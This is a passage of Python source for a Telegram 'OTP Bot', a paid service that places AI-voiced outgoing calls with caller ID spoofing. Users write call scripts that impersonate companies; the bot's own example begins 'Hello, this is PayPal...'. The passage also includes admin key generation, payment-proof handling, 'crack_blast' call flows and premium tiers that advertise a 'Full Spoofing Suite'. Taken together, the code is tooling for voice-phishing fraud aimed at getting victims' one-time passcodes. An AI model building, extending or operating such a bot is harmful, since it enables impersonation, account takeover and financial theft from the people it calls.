                f"Key: <code>{key['token']}</code>\n"
                f"Duration: {days} days\n"
                f"Type: Premium Subscription\n"
                f"Created: {key['created_at']}\n\n"
                f"This key is <b>tamper-proof</b> and will give exactly {days} days of premium access.\n"
                f"User redeems via: Account > Redeem Premium Key",
                parse_mode="HTML"
            )
            logger.info(f"Admin {user_id_str} generated custom {days}-day key: {key['token']}")
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid input. Enter a number (e.g., 5, 10, 30)")
        finally:
            clear_user_state(user_id_str)
        return

    # --- Admin custom free calls input ---
    if state == "admin_custom_free_calls":
        try:
            call_count = int(text.strip())
            if call_count <= 0 or call_count > 10000:  # Reasonable upper limit
                bot.send_message(message.chat.id, "❌ Invalid. Enter calls between 1-10000.")
                return
            
            # Generate the free calls key
            free_calls_key = {
                "token": secrets.token_urlsafe(16).upper(),
                "free_calls": call_count,
                "created_by": user_id_str,
                "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                "used": False,
                "type": "FREE_CALLS"
            }
            keys = load_premium_keys()
            keys.append(free_calls_key)
            save_premium_keys(keys)
            
            bot.send_message(
                message.chat.id,
                f"✅ <b>CUSTOM FREE CALLS KEY GENERATED</b>\n\n"
                f"Key: <code>{free_calls_key['token']}</code>\n"
                f"Free Calls: {call_count}\n"
                f"Type: Free Calls Package\n"
                f"Created: {free_calls_key['created_at']}\n\n"
                f"This key grants exactly {call_count} free calls.\n"
                f"<b>Tamper-proof:</b> Cannot be manipulated or duplicated.\n"
                f"User redeems via: Account > Redeem Premium Key",
                parse_mode="HTML"
            )
            logger.info(f"Admin {user_id_str} generated {call_count}-call free calls key: {free_calls_key['token']}")
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid input. Enter a number (e.g., 10, 50, 100)")
        finally:
            clear_user_state(user_id_str)
        return

    # --- Create script: Get name ---
    if state == "create_script_name":
        script_name = text.strip()
        if not script_name:
            bot.send_message(message.chat.id, "❌ Script name cannot be empty.")
            return
        if len(script_name) > 50:
            bot.send_message(message.chat.id, "❌ Script name too long (max 50 characters).")
            return
        
        # Store name and ask for content
        write_user_file(user_id_str, "temp_script_name.txt", script_name)
        set_user_state(user_id_str, "create_script_content")
        
        bot.send_message(
            message.chat.id,
            f"✅ Script name saved: <code>{script_name}</code>\n\n"
            f"Step 2/2: Script Content\n\n"
            f"Now send the script content (max 1800 characters).\n\n"
            f"<b>Tips:</b>\n"
            f"• Use placeholders: {{name}}, {{code}}, {{company}}\n"
            f"• Include [GREETING], [PAUSE_WAIT], [GATHER], etc.\n"
            f"• Keep it professional and concise",
            parse_mode="HTML"
        )
        return

    # --- Create script: Get content and save ---
    if state == "create_script_content":
        script_content = text.strip()
        if not script_content:
            bot.send_message(message.chat.id, "❌ Script content cannot be empty.")
            return
        if len(script_content) > 1800:
            bot.send_message(message.chat.id, "❌ Script too long (max 1800 characters).")
            return
        
        # Get the saved name
        script_name = read_user_file(user_id_str, "temp_script_name.txt", "Untitled Script")
        
        # Save to database
        try:
            import uuid
            script_id = str(uuid.uuid4())
            rows = db_get_script_rows(user_id_str)
            new_row = {
                "id": script_id,
                "user_id": user_id_str,
                "name": script_name,
                "content": script_content,
                "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                "updated_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            }
            rows.append(new_row)
            db_save_script_rows(user_id_str, rows)
            
            bot.send_message(
                message.chat.id,
                f"✅ <b>SCRIPT SAVED SUCCESSFULLY!</b>\n\n"
                f"📝 Name: <code>{script_name}</code>\n"
                f"📏 Length: {len(script_content)} characters\n"
                f"🎯 Type: Personal Script\n"
                f"🕐 Created: {new_row['created_at']}\n\n"
                f"You can now use this script in your calls!\n"
                f"Select it from Script Library when building calls.",
                parse_mode="HTML"
            )
            logger.info(f"User {user_id_str} created script: {script_name}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error saving script: {e}")
            logger.error(f"Error saving script for {user_id_str}: {e}")
        finally:
            clear_user_state(user_id_str)
            write_user_file(user_id_str, "temp_script_name.txt", "")
        return

    # --- Paste script to library ---
    if state == "paste_script_library_content":
        content = text.strip()
        if not content:
            bot.send_message(message.chat.id, "❌ Script content cannot be empty.")
            return
        
        # Parse content: Name on line 1, blank line 2, content from line 3
        lines = content.split("\n")
        if len(lines) < 2:
            bot.send_message(message.chat.id, "❌ Invalid format. Use: Name\\n\\nContent")
            return
        
        script_name = lines[0].strip()
        script_content = "\n".join(lines[2:]).strip()  # Skip name and blank line
        
        if not script_name or not script_content:
            bot.send_message(message.chat.id, "❌ Script name and content cannot be empty.")
            return
        if len(script_name) > 50:
            bot.send_message(message.chat.id, "❌ Script name too long (max 50 characters).")
            return
        if len(script_content) > 1800:
            bot.send_message(message.chat.id, "❌ Script too long (max 1800 characters).")
            return
        
        # Save to database
        try:
            import uuid
            script_id = str(uuid.uuid4())
            rows = db_get_script_rows(user_id_str)
            new_row = {
                "id": script_id,
                "user_id": user_id_str,
                "name": script_name,
                "content": script_content,
                "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                "updated_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            }
            rows.append(new_row)
            db_save_script_rows(user_id_str, rows)
            
            bot.send_message(
                message.chat.id,
                f"✅ <b>SCRIPT PASTED & SAVED!</b>\n\n"
                f"📝 Name: <code>{script_name}</code>\n"
                f"📏 Length: {len(script_content)} characters\n"
                f"🎯 Type: Personal Script\n"
                f"🕐 Created: {new_row['created_at']}\n\n"
                f"Script is ready to use in your calls!",
                parse_mode="HTML"
            )
            logger.info(f"User {user_id_str} pasted script: {script_name}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error saving pasted script: {e}")
            logger.error(f"Error pasting script for {user_id_str}: {e}")
        finally:
            clear_user_state(user_id_str)
        return

    logger.warning(f"Unknown state '{state}' for user {user_id_str}; resetting state.")
    clear_user_state(user_id_str)
    bot.send_message(message.chat.id, "⚠️ Previous session expired or was reset. Send /start to continue.")

# ======================================================================
# PAYMENT PROOF - PHOTO HANDLER
# ======================================================================
@bot.message_handler(content_types=['photo'])
def handle_payment_proof_photo(message):
    user_id_str = str(message.from_user.id)
    state = get_user_state(user_id_str)
    
    if not state.startswith("awaiting_proof_"):
        return
    
    verification_id = state.replace("awaiting_proof_", "")
    verification = get_verification_by_id(verification_id)
    
    if not verification:
        bot.send_message(message.chat.id, "❌ Verification session expired. Please try again.")
        clear_user_state(user_id_str)
        return
    
    # Get the largest photo size
    photo = message.photo[-1]
    file_id = photo.file_id
    
    # Add proof to verification
    add_proof_to_verification(verification_id, file_id, "photo")
    
    # Notify user
    bot.send_message(
        message.chat.id,
        f"✅ <b>PROOF SUBMITTED</b>\n\n"
        f"Your screenshot for <b>{verification['plan_name']}</b> ({verification['price']}) has been received.\n\n"
        f"📋 <b>Verification ID:</b> <code>{verification_id}</code>\n\n"
        f"Our admin team will review and approve shortly. You'll receive a confirmation message with your premium access details.",
        parse_mode="HTML"
    )
    
    # Forward to admin/developer with photo
    admin_message = format_verification_for_admin(verification)
    
    if OWNER_ID:
        bot.send_photo(OWNER_ID, file_id, caption=admin_message, parse_mode="HTML")
    for dev_id in DEVELOPER_IDS:
        bot.send_photo(dev_id, file_id, caption=admin_message, parse_mode="HTML")
    
    clear_user_state(user_id_str)

# ======================================================================
# PAYMENT PROOF - DOCUMENT HANDLER
# ======================================================================
@bot.message_handler(content_types=['document'])
def handle_payment_proof_document(message):
    user_id_str = str(message.from_user.id)
    state = get_user_state(user_id_str)
    
    if not state.startswith("awaiting_proof_"):
        return
    
    verification_id = state.replace("awaiting_proof_", "")
    verification = get_verification_by_id(verification_id)
    
    if not verification:
        bot.send_message(message.chat.id, "❌ Verification session expired. Please try again.")
        clear_user_state(user_id_str)
        return
    
    # Get document
    document = message.document
    file_id = document.file_id
    file_name = document.file_name or "proof_document"
    
    # Add proof to verification
    add_proof_to_verification(verification_id, file_id, "document")
    
    # Notify user
    bot.send_message(
        message.chat.id,
        f"✅ <b>PROOF SUBMITTED</b>\n\n"
        f"Your document <code>{html.escape(file_name)}</code> for <b>{verification['plan_name']}</b> ({verification['price']}) has been received.\n\n"
        f"📋 <b>Verification ID:</b> <code>{verification_id}</code>\n\n"
        f"Our admin team will review and approve shortly. You'll receive a confirmation message with your premium access details.",
        parse_mode="HTML"
    )
    
    # Forward to admin/developer with document
    admin_message = format_verification_for_admin(verification)
    admin_message += f"\n\n📄 <b>DOCUMENT:</b> {file_name}"
    
    if OWNER_ID:
        bot.send_document(OWNER_ID, file_id, caption=admin_message, parse_mode="HTML")
    for dev_id in DEVELOPER_IDS:
        bot.send_document(dev_id, file_id, caption=admin_message, parse_mode="HTML")
    
    clear_user_state(user_id_str)

# ======================================================================
# SCRIPTS CREATE COMMAND (direct handler)
# ======================================================================
@bot.callback_query_handler(func=lambda call: call.data == "create_script")
def create_script_callback(call):
    user_id_str = str(call.from_user.id)
    set_user_state(user_id_str, "creating_script")
    init_user_db(user_id_str)
    bot.send_message(
        call.message.chat.id,
        "📝 <b>Create New Script</b>\n\nSend the script name, then a blank line, then the script content.\nExample:\n\nMy PayPal Script\n\n[GREETING]\nHello, this is PayPal...\n\n• Max 1800 characters\n• You will receive confirmation when saved.",
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == "paste_script_to_library")
def paste_script_to_library_callback(call):
    user_id_str = str(call.from_user.id)
    set_user_state(user_id_str, "creating_script")
    init_user_db(user_id_str)
    bot.send_message(
        call.message.chat.id,
        "📋 <b>Paste Custom Script</b>\n\nSend the script name, then a blank line, then the script content to save it to your library.",
        parse_mode="HTML"
    )

# ======================================================================
# SCRIPTS LIST (My Scripts)
# ======================================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("my_scripts") or call.data == "my_scripts")
def my_scripts_callback(call):
    user_id_str = str(call.from_user.id)
    rows = db_get_script_rows(user_id_str)
    my_rows = [row for row in rows if row["user_id"] == user_id_str]
    if not my_rows:
        bot.send_message(call.message.chat.id, "📚 No scripts found. Create one first with /create_script")
        return
    lines = [f"• {i+1}. {row['name']}" for i, row in enumerate(my_rows)]
    bot.send_message(call.message.chat.id, f"📚 <b>Your Scripts</b>\n\n" + "\n".join(lines), parse_mode="HTML")

# ======================================================================
# COMMAND HANDLERS
# ======================================================================
@bot.message_handler(commands=["start"])
def start_handler(message):
    user_id_str = str(message.from_user.id)
    logger.info(f"👤 /start command from user {user_id_str}")
    
    ensure_user_path(user_id_str)
    clear_user_state(user_id_str)
    
    # Track user in database and update activity
    # This should create the user in PostgreSQL
    user_created = add_user_if_not_exists(user_id_str)
    if user_created:
        logger.info(f"   ✅ User {user_id_str} created in PostgreSQL")
    else:
        logger.info(f"   ℹ️  User {user_id_str} already exists in PostgreSQL")
    
    activity_updated = update_last_activity(user_id_str)
    if activity_updated is not False:  # None is success
        logger.info(f"   ✅ User {user_id_str} activity timestamp updated")
    
    # Initialize free-trial allocation only when no server-side master entry
    # and no per-user file exists. This prevents users from regaining trials
    # by deleting local chat history or per-user conf files.
    try:
        from core.files import get_master_free_calls
        master_exists = get_master_free_calls(user_id_str) is not None
    except Exception:
        master_exists = False

    if not master_exists and not os.path.exists(user_conf_path(user_id_str) / "free_calls.txt") and check_subscription(user_id_str) != "ACTIVE":
        set_free_calls(user_id_str, FREE_TRIAL_TOTAL)
    send_main_menu(message.chat.id, message.from_user)

@bot.message_handler(commands=["help"])
def help_handler(message):
    help_text = (
        "🤖 <b>OTP Bot User Guide</b>:\n"
        "🔑 /check: Check subscription status.\n"
        "⚙️ /clearset: Reset settings.\n"
        "🎙️ /start: Start the bot.\n"
        "ℹ️ /about: Learn how the bot works.\n"
        "/create_script: Create a new call script.\n"
        "/my_scripts: List your saved scripts.\n"
        "💡 For more info, contact main channel."
    )
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(commands=["about"])
def about_handler(message):
    about_text = (
        "🤖 <b>About OTP Bot</b>\n"
        "AI-powered call assistant using AI mode for natural outgoing calls, caller ID spoofing, premium access, loyalty keys, instant status checks, smart voice selection, and secure tamper-proof key redemption."
    )
    bot.send_message(message.chat.id, about_text, parse_mode="HTML")

@bot.message_handler(commands=["check"])
def check_handler(message):
    user_id_str = str(message.from_user.id)
    if check_subscription(user_id_str) == "ACTIVE":
        bot.send_message(message.chat.id, f"🔑 Subscription: ACTIVE ✅\nID: {message.from_user.id}")
    else:
        bot.send_message(message.chat.id, f"🔑 Subscription: DISABLED ❌\nContact owner.")

@bot.message_handler(commands=["shop"])
def shop_handler(message):
    send_shop_menu(message.chat.id)

@bot.message_handler(commands=["add_subs"])
def add_subs_handler(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Permission denied.")
        return
    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.send_message(message.chat.id, "❌ Usage: /add_subs [User ID] [Days]")
        return
    user_id = parts[1]
    days = parts[2]
    if not days.isdigit():
        bot.send_message(message.chat.id, "❌ Days must be a number.")
        return
    new_exp = datetime.now() + timedelta(days=int(days))
    expiry_str = new_exp.strftime("%d/%m/%Y")
    write_user_file(user_id, "subs.txt", expiry_str)
    bot.send_message(message.chat.id, f"✅ Added {days} days to {user_id}. Expires: {expiry_str}")

@bot.message_handler(commands=["clearset"])
def clearset_handler(message):
    user_id_str = str(message.from_user.id)
    for f in ["phonenum.txt", "Name.txt", "Digits.txt", "Company Name.txt", "Caller ID.txt", "From Name.txt", "Language.txt", "Delivery.txt", "Voice.txt", "VoiceName.txt", "emotion.txt"]:
        try:
            (user_conf_path(user_id_str) / f).unlink()
        except:
            pass
    bot.send_message(message.chat.id, "✅ Settings cleared.")

@bot.message_handler(commands=["create_script"])
def create_script_command(message):
    user_id_str = str(message.from_user.id)
    set_user_state(user_id_str, "creating_script")
    init_user_db(user_id_str)
    bot.send_message(
        message.chat.id,
        "📝 <b>Create New Script</b>\n\nSend the script name, then a blank line, then the script content.\nExample:\n\nMy PayPal Script\n\n[GREETING]\nHello, this is PayPal...\n\n• Max 1800 characters\n• You will receive confirmation when saved.",
        parse_mode="HTML"
    )

@bot.message_handler(commands=["my_scripts"])
def my_scripts_command(message):
    user_id_str = str(message.from_user.id)
    rows = db_get_script_rows(user_id_str)
    my_rows = [row for row in rows if row["user_id"] == user_id_str]
    if not my_rows:
        bot.send_message(message.chat.id, "📚 No scripts found. Create one first with /create_script")
        return
    lines = [f"• {i+1}. {row['name']}" for i, row in enumerate(my_rows)]
    bot.send_message(message.chat.id, f"📚 <b>Your Scripts</b>\n\n" + "\n".join(lines), parse_mode="HTML")

# ======================================================================
# SKIP COMMAND (/skip) — Used during call setup steps
# ======================================================================
@bot.message_handler(commands=["skip"])
def skip_command(message):
    """
    Skip optional steps in call setup and use the default Twilio caller ID.
    """
    user_id_str = str(message.from_user.id)
    state = get_user_state(user_id_str)

    if state == "normal_call_step_4_callerid":
        clear_user_state(user_id_str)
        bot.send_message(message.chat.id, "⚠️ Legacy Normal Call steps removed. Use /normal to start the upgraded flow.")
        return

    if state == "manual_call_step_2_callerid":
        write_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER)
        set_user_state(user_id_str, "manual_call_step_3_script_choice")
        buttons = types.InlineKeyboardMarkup(row_width=1)
        buttons.add(types.InlineKeyboardButton("✍️ Paste custom script", callback_data="manual_script_paste"))
        buttons.add(types.InlineKeyboardButton("📚 Select saved script", callback_data="manual_script_library"))
        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
        bot.send_message(
            message.chat.id,
            "✅ Caller ID set to default.\n\n💠 Step 3/8: Script\nChoose whether to paste a new script or select one from your library.",
            reply_markup=buttons,
        )
        return

    if state == "custom_call_step_4_callerid":
        write_user_file(user_id_str, "custom_caller_id.txt", TWILIO_PHONE_NUMBER)
        set_user_state(user_id_str, "custom_call_step_5_voice")
        bot.send_message(message.chat.id, "✅ Caller ID set to default.\n\n🎤 Step 4/8: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
        try:
            from menu_utils import build_voice_selection_keyboard
            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
        except Exception:
            bot.send_message(message.chat.id, "Send the voice number or name now.")
        return

    if state == "crack_blast_step_3_callerid":
        write_user_file(user_id_str, "crack_caller_id.txt", TWILIO_PHONE_NUMBER)
        set_user_state(user_id_str, "crack_blast_step_4_voice")
        bot.send_message(message.chat.id, "✅ Caller ID set to default.\n\n🎤 Step 4/7: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
        try:
            from menu_utils import build_voice_selection_keyboard
            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
        except Exception:
            bot.send_message(message.chat.id, "Send the voice number or name now.")
        return

    bot.send_message(message.chat.id, "⚠️ /skip is only available during the Caller ID step.")

# ======================================================================
# ADMIN APPROVAL COMMAND (/approve)
# ======================================================================
@bot.message_handler(commands=["approve"])
def approve_command(message):
    """
    Admin command to approve payment verifications.
    Usage: /approve <user_id> <duration>
    Duration: 3h, 1d, 3d, 7d, lifetime
    Example: /approve 123456789 7d
    """
    user_id_str = str(message.from_user.id)
    
    # Check if user is admin/privileged
    if not is_privileged_user(user_id_str):
        bot.send_message(message.chat.id, "❌ You don't have permission to use this command.")
        return
    
    # Parse command
    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.send_message(
            message.chat.id,
            "❌ <b>Invalid format.</b>\n\n"
            "<b>Usage:</b> /approve &lt;user_id&gt; &lt;duration&gt;\n\n"
            "<b>Duration options:</b>\n"
            "• 3h → 3 hours\n"
            "• 1d → 1 day\n"
            "• 3d → 3 days\n"
            "• 7d → 7 days\n"
            "• lifetime → Lifetime access\n\n"
            "<b>Example:</b> /approve 123456789 7d",
            parse_mode="HTML"
        )
        return
    
    target_user_id = parts[1]
    duration_str = parts[2].lower()
    
    # Map duration strings to days
    duration_map = {
        "3h": 0.125,
        "1d": 1,
        "3d": 3,
        "7d": 7,
        "lifetime": 9999,
    }
    
    if duration_str not in duration_map:
        bot.send_message(
            message.chat.id,
            f"❌ Invalid duration: {duration_str}\n\n"
            "Valid options: 3h, 1d, 3d, 7d, lifetime",
            parse_mode="HTML"
        )
        return

    success, expiry_str, display_duration, purchase_count, loyalty_gift_awarded, loyalty_key_token = apply_premium_subscription(target_user_id, duration_str)
    if not success:
        bot.send_message(message.chat.id, "❌ Failed to apply premium approval. Please try again.")
        return

    logger.info(f"👤 Approving user {target_user_id} for {display_duration}")

    if loyalty_gift_awarded:
        logger.info(f"✅ Loyalty gift awarded to {target_user_id}: Auto key {loyalty_key_token}")

    # Send confirmation to admin
    admin_msg = (
        f"✅ <b>APPROVAL GRANTED</b>\n\n"
        f"👤 User ID: <code>{target_user_id}</code>\n"
        f"⏰ Duration: {display_duration}\n"
        f"📅 Expires: <code>{expiry_str}</code>\n"
        f"🛍️ Purchase Count: <code>{purchase_count}/5</code>\n"
    )
    
    if loyalty_gift_awarded:
        admin_msg += (
            f"\n🎁 <b>LOYALTY GIFT AWARDED!</b>\n"
            f"🔑 Auto Key Generated: <code>{loyalty_key_token}</code>\n"
            f"📦 1-Day Premium Key (Auto)\n"
            f"🔄 Purchase counter reset to 0/5"
        )
    
    bot.send_message(message.chat.id, admin_msg, parse_mode="HTML")
    
    # Send confirmation to user
    user_confirmation = (
        f"✅ <b>PREMIUM APPROVED!</b>\n\n"
        f"🎉 Your payment has been verified and approved.\n\n"
        f"📋 <b>Premium Plan Details:</b>\n"
        f"⏰ <b>Duration:</b> {display_duration}\n"
        f"📅 <b>Expires:</b> <code>{expiry_str}</code>\n"
        f"🛍️ <b>Your Purchase Progress:</b> <code>{purchase_count}/5</code>\n\n"
    )
    
    if loyalty_gift_awarded:
        user_confirmation += (
            f"🎁 <b>🎉 LOYALTY GIFT AWARDED! 🎉</b>\n\n"
            f"Congratulations on your 5th successful payment!\n\n"
            f"🔑 <b>FREE 1-DAY PREMIUM KEY (Auto-Generated):</b>\n"
            f"<code>{loyalty_key_token}</code>\n\n"
            f"✅ This key is automatically activated for 24 hours.\n"
            f"📌 No redemption needed - enjoy your free day!\n\n"
        )
    
    user_confirmation += (
        f"🚀 You now have full access to all premium features:\n"
        f"• Unlimited Fast Calls\n"
        f"• Full Spoofing Suite\n"
        f"• AI MODE V2\n"
        f"• Fast Response Engine\n"
        f"• And much more!\n\n"
        f"Thank you for your purchase! 🙏"
    )
    
    try:
        bot.send_message(int(target_user_id), user_confirmation, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"Could not send confirmation to user {target_user_id}: {e}")
        bot.send_message(
            message.chat.id,
            f"⚠️ Approval granted, but could not send confirmation to user (they may have blocked the bot)."
        )

# ======================================================================
# REDEEM COMMAND (/redeem) - Show redemption tutorial
# ======================================================================
@bot.message_handler(commands=["redeem"])
def redeem_command(message):
    """
    User command to learn about redeeming premium keys.
    Shows how to redeem and explains time accuracy guarantee.
    """
    user_id_str = str(message.from_user.id)
    
    redeem_tutorial = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔑 <b>HOW TO REDEEM YOUR PREMIUM KEY</b> 🔑\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>📌 STEP 1: FIND YOUR KEY</b>\n"
        "Your premium keys are generated by:\n"
        "• Loyalty Gift System (5 payments = 1 free 1-day key)\n"
        "• Admin-generated keys from KEY ADMIN panel\n"
        "• Custom premium packages from /shop\n\n"
        "<b>📌 STEP 2: OPEN YOUR ACCOUNT</b>\n"
        "• Press /start\n"
        "• Tap <b>👤 Account</b>\n"
        "• Tap <b>🔑 Redeem Premium Key</b>\n\n"
        "<b>📌 STEP 3: PASTE YOUR KEY</b>\n"
        "Simply paste your key code exactly as given:\n"
        "<code>ABC123DEF456GHI789</code>\n\n"
        "<b>📌 STEP 4: INSTANT ACTIVATION</b>\n"
        "✅ Key validated\n"
        "✅ Premium time added to your account\n"
        "✅ Expiry date set immediately\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>🔒 TAMPER-PROOF TIME GUARANTEE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⏰ <b>Strict Time Accuracy:</b>\n"
        "• 1-Day Key = EXACTLY 24 hours\n"
        "• 7-Day Key = EXACTLY 7 × 24 hours\n"
        "• 30-Day Key = EXACTLY 30 days\n"
        "• <u>NO</u> manipulation possible\n"
        "• <u>NO</u> time reduction after redemption\n\n"
        "🔐 <b>Security Features:</b>\n"
        "• Keys can ONLY be used ONCE\n"
        "• Each key is tracked permanently\n"
        "• Used keys cannot be reused\n"
        "• Admin audit log keeps all records\n"
        "• System verifies exact expiry dates\n\n"
        "💡 <b>Pro Tips:</b>\n"
        "• Keys stack with existing premium time\n"
        "• If you have 5 days left, +7 day key = 12 days total\n"
        "• Save your keys in a safe place\n"
        "• Each key is unique and tied to your account\n\n"
        "❌ <b>What Can't Happen:</b>\n"
        "• Keys can't be duplicated\n"
        "• Time can't be manually edited\n"
        "• Keys can't be shared between accounts\n"
        "• Expiry dates can't be changed\n"
        "• System enforces exact time allocation\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 Ready to redeem? Go to Account → Redeem Premium Key"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🔑 Redeem Now", callback_data="redeem_premium_key"))
    buttons.add(types.InlineKeyboardButton("👤 Back to Account", callback_data="account"))
    
    bot.send_message(user_id_str, redeem_tutorial, reply_markup=buttons, parse_mode="HTML")

# ======================================================================
# CHAT MEMBER HANDLER
# ======================================================================
@bot.chat_member_handler(func=lambda update: True)
def handle_chat_member(update):
    try:
        user_id = None
        if hasattr(update, "new_chat_member") and update.new_chat_member:
            user_id = update.new_chat_member.user.id
            new_status = update.new_chat_member.status
        elif hasattr(update, "old_chat_member") and update.old_chat_member:
            user_id = update.old_chat_member.user.id
            new_status = update.new_chat_member.status if hasattr(update, "new_chat_member") else None
        else:
            return
        if new_status in ["left", "kicked"]:
            channel_id = update.chat.id if hasattr(update, "chat") else None
            write_user_file(str(user_id), "joined_channels.txt", "no")
            write_user_file(str(user_id), "left_channel.txt", str(channel_id))
    except:
        pass

# ======================================================================
# START BACKGROUND THREADS
# ======================================================================
def get_runtime_mode(bot_client=None) -> str:
    if bot_client is None:
        logger.warning("Telegram bot not configured. Continuing in web-only mode without Telegram polling.")
        return "web-only"
    return "full"


def start_background_threads():
    start_rate_limiter_cleanup()
    start_scheduler()
    # Start async file write worker for non-blocking file writes
    try:
        start_write_worker()
    except Exception:
        logger.exception("Failed to start async write worker")
    if should_start_polling():
        start_polling_watchdog()
    # Start ngrok watcher to auto-update webhook when ngrok public URL changes
    try:
        start_ngrok_watcher()
    except Exception:
        logger.exception("Failed to start ngrok watcher")
    logger.info("Background threads started.")


def _polling_worker(allowed_updates: Optional[list[str]] = None, base_delay: int = 2):
    if bot is None:
        logger.error("Telegram bot not configured. Check BOT_TOKEN environment variable.")
        return False

    _allowed = allowed_updates or ["message", "callback_query", "chat_member"]
    logger.info("Starting Telegram polling worker...")

    try:
        bot.remove_webhook()
    except Exception as e:
        logger.debug(f"Could not remove webhook before polling: {e}")

    last_update_id = None
    while not _polling_stop_event.is_set():
        try:
            updates = bot.get_updates(
                offset=(last_update_id + 1) if last_update_id is not None else None,
                timeout=30,
                allowed_updates=_allowed,
            )
            if updates:
                last_update_id = updates[-1].update_id
                bot.process_new_updates(updates)
        except requests.exceptions.ReadTimeout:
            continue
        except requests.exceptions.ConnectionError as e:
            logger.warning(f"Telegram connection error: {e}. Reconnecting in {base_delay}s")
            time.sleep(base_delay)
        except KeyboardInterrupt:
            logger.info("Telegram polling interrupted by keyboard")
            return True
        except telebot.apihelper.ApiTelegramException as e:
            msg = str(e).lower()
            # Handle common 409 cases:
            # - webhook conflict (webhook set while polling)
            # - terminated by other getUpdates request (another polling instance)
            if "409" in msg and ("webhook" in msg or "setwebhook" in msg):
                logger.warning(
                    "Telegram webhook conflict detected during polling. Removing webhook and retrying polling."
                )
                try:
                    bot.remove_webhook()
                    logger.info("Telegram webhook removed to recover polling mode.")
                except Exception as remove_exc:
                    logger.error(
                        f"Failed to remove Telegram webhook during polling recovery: {remove_exc}",
                        exc_info=True,
                    )
                time.sleep(base_delay)
                continue
            # Another common 409: conflict because another getUpdates polling is active
            if "409" in msg and ("other getupdates" in msg or "terminated by other getupdates" in msg or "terminated by other getupdates request" in msg or ("conflict" in msg and "getupdates" in msg)):
                logger.warning(
                    "Telegram polling conflict detected: another getUpdates instance is running. Pausing polling and retrying later."
                )
                # Back off for longer to avoid tight error loops; watchdog can restart polling later
                time.sleep(60)
                continue
            logger.error(f"Unhandled polling API error: {e}", exc_info=True)
            time.sleep(base_delay)
        except Exception as e:
            logger.error(f"Unhandled polling error: {e}", exc_info=True)
            time.sleep(base_delay)

    logger.info("Polling worker exiting cleanly.")
    return True


def start_bot_polling(
    allowed_updates: Optional[list[str]] = None,
    base_delay: int = 2,
) -> bool:
    global _polling_thread
    if bot is None:
        logger.error("Telegram bot not configured. Check BOT_TOKEN environment variable.")
        return False

    if _polling_thread and _polling_thread.is_alive():
        logger.info("Polling already running.")
        return True

    _polling_stop_event.clear()
    _polling_thread = threading.Thread(
        target=_polling_worker,
        args=(allowed_updates, base_delay),
        daemon=True,
        name="TelegramPollingThread"
    )
    _polling_thread.start()
    return True


def stop_bot_polling() -> None:
    _polling_stop_event.set()
    if _polling_thread:
        _polling_thread.join(timeout=10)
    _polling_thread = None


def _polling_watchdog(interval: int = 30, restart_delay: int = 5) -> None:
    global _polling_thread
    while True:
        time.sleep(interval)
        if _polling_thread is None or not _polling_thread.is_alive():
            logger.warning("Polling thread stopped; restarting bot polling.")
            try:
                start_bot_polling()
            except Exception as e:
                logger.error(f"Polling watchdog failed to restart bot: {e}")
            time.sleep(restart_delay)


def start_polling_watchdog() -> None:
    global _polling_watchdog_thread
    if _polling_watchdog_thread and _polling_watchdog_thread.is_alive():
        return
    _polling_watchdog_thread = threading.Thread(
        target=_polling_watchdog,
        daemon=True,
        name="PollingWatchdogThread"
    )
    _polling_watchdog_thread.start()
# MAIN ENTRY
# ======================================================================
if __name__ == "__main__":
    import signal
    
    def handle_shutdown(signum, frame):
        """Gracefully shutdown on SIGTERM or SIGINT."""
        logger.info(f"\n{'='*70}")
        logger.info("⚠️  Shutdown signal received. Cleaning up...")
        logger.info(f"{'='*70}")
        try:
            stop_bot_polling()
            logger.info("✅ Bot polling stopped")
        except Exception as e:
            logger.warning(f"Error stopping polling: {e}")
        logger.info("🛑 Exiting...")
        sys.exit(0)
    
    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGTERM, handle_shutdown)
    signal.signal(signal.SIGINT, handle_shutdown)
    
    Path("conf").mkdir(exist_ok=True)
    start_background_threads()

    runtime_mode = get_runtime_mode(bot)
    logger.info(f"Starting application in {runtime_mode} mode.")

    TARGET_PORT = int(os.getenv("PORT", os.getenv("FLASK_PORT", "5000")))
    logger.info(f"Starting Flask web server on port {TARGET_PORT}.")

    def run_flask():
        try:
            app.run(host='0.0.0.0', port=TARGET_PORT, debug=False, use_reloader=False, threaded=True)
        except OSError as e:
            if "Address already in use" in str(e) or "Permission denied" in str(e):
